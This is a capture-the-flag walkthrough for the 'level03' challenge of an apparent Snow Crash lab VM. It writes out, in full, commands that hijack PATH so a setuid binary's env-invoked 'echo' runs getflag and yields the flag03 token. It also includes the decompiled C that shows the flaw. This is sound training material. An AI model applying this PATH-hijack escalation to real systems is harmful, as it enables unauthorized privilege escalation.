# level03

## Steps

1. __Action__ (Guest): list the files present in the `level03` user's home directory
	```sh
	ls -A
	```

2. __Observation__ (Guest): the previous command reveals 1 file possibly of interest,
	named `level03`
	```
	.bash_logout  .bashrc  level03  .profile
	```

3. __Action__ (Guest): check the file access control list of the `level03` file
	```sh
	getfacl level03
	```

4. __Observation__ (Guest): the previous command reveals that the `level03` file:
	- is readable by the `level03` user
	- is executable by the `level03` user
	- is owned by the `flag03` user
	- has the `setuid` bit enabled
	```
	# file: level03
	# owner: flag03
	# group: level03
	# flags: ss-
	user::rwx
	group::r-x
	other::r-x
	```

5. __Action__ (Guest): execute the `level03` file
	```sh
	./level03
	```

6. __Observation__ (Guest): the message `Exploit me` appears on stdout

7. __Action__ (Host): copy the `level03` file from the virtual machine
	```sh
	sshpass -f snow-crash/level02/flag \
		scp -P 4242 level03@192.168.122.214:level03 .
	```

8. __Action__ (Host): decompile the `level03` file using [dogbolt](https://dogbolt.org/),
	and manually improve the lisibility of the decompiled code

9. __Observation__ (Host): after reverse engineering the `level03` file, we obtain the following
	C code, which sets the real, effective, and saved user and group IDs, and then
	invokes the `/usr/bin/env echo Exploit me` command through the `system` function,
	which is a security vulnerability when used to call a command
	without specifying its absolute path
	```c
	#include <unistd.h>

	int main(void) {
		gid_t const gid = getegid();
		uid_t const uid = geteuid();

		setresgid(gid, gid, gid);
		setresuid(uid, uid, uid);

		return system("/usr/bin/env echo Exploit me");
	}
	```

10. __Action__ (Guest): create a symbolic link to the `getflag` file named `echo`
	to exploit the security vulnerability mentioned above
	```sh
	ln -s $( which getflag ) /tmp/echo
	```

11. __Action__ (Guest): execute `./level03` with an altered environment
	to make it invoke our `echo` symbolic link instead of the real `echo` command
	and save the token to a file
	```sh
	env PATH=/tmp ./level03 | egrep -o '[^ ]+$' >/tmp/token
	```

12. __Action__ (Host): copy the token from the virtual machine
	```sh
	sshpass -f level02/flag \
		scp -P 4242 level03@192.168.122.214:/tmp/token level03/flag
	```

13. __Action__ (Guest): remove the `echo` symbolic link and the `token` file
	```sh
	rm /tmp/echo /tmp/token
	```
